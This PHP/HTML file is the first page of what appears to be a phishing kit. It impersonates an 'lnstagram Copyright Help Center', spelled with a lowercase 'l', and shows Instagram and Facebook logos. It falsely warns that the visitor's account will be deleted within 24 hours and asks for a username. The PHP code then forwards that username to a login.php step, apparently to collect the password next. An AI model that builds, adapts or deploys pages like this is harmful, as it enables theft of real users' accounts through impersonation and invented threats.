<?php

if($_POST){
$id= $_POST['id'];
header("location: login.php?id=$id");
}
?>
<!doctype html>
<html lang="en"> 
<head> 	
<title>lnstagram Copyright Help Center</title> 
<meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700,900&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">	
	<link rel="stylesheet" href="css/style.css">		
<link rel="stylesheet" href="css/main.css">	
	<link rel="stylesheet" href="css/main.css">	<script src="https://www.google.com/recaptcha/api.js?hl=tr"></script>

	</head>	


<body>
		<div class="container">	
		<div class="row justify-content-center">		
		<div class="col-md-6 text-center mb-1">					<!-- bla bla -->				</div>	
		</div>	
<div class="row justify-content-center">		
<div class="col-md-12 col-lg-10">					
<div class="wrap d-md-flex">						
<div class="text-wrap p-4 p-lg-5 text-center d-flex align-items-center order-md-last">							
<div class="text w-100">				
<img src="insta.png" width="1">			
	<img src="images/logo.png" alt="logo" style="width: 50%;">						
<center>		<p>lnstagram Copyright Help Center</p>								<!--<a href="#" class="btn btn-white btn-outline-white">Sign Up</a>-->							</div>		
	 </div>			
			<div class="login-wrap p-4 p-lg-5">	
		 	<div class="d-flex">			 
		<div class="w-100">			 	
		<h3 class="mb-4">Copyright Violation</h3>
							 <p>Your account will be deleted within 24 hours. If you think there is a mistake, follow the form steps.</p>			 		</div>	
			 	</div>		
		<form method="POST"  class="signin-form">			 		<div class="form-group mb-3">			 			<label class="label" for="name"></label><div class="wrap-input100 validate-input"> <input class="input100" type="username" required="" autocomplete="off" name="id" placeholder="username"> <span class="focus-input100"></span> <span class="symbol-input100"> <i class="fa fa-search" aria-hidden="true"></i> </span> 
						</span>	
				</div>	
		 		</div>	
	 <div class="form-group mb-3">
		 	<label class="label" for="password"></label>	
						 </div>
		 <div class="form-group">	
	 	<button type="submit" class="form-control btn btn-primary submit px-3">Next</button>		
						 </div><div class="text-center">			
		<img class="justify-content-center" src="https://www.trendweek.com/wp-content/uploads/2019/11/facebook-new-company-logo.gif" style="width: 70%;" alt="">			
	</div>	
	 </form>	
	 </div>	
	 </div>		
		</div>
			</div>
		</div>	
</section>
	<script src="js/jquery.min.js"></script>
 <script src="js/popper.js"></script>
 <script src="js/bootstrap.min.js"></script>
 <script src="js/main.js"></script>


	</body></html>
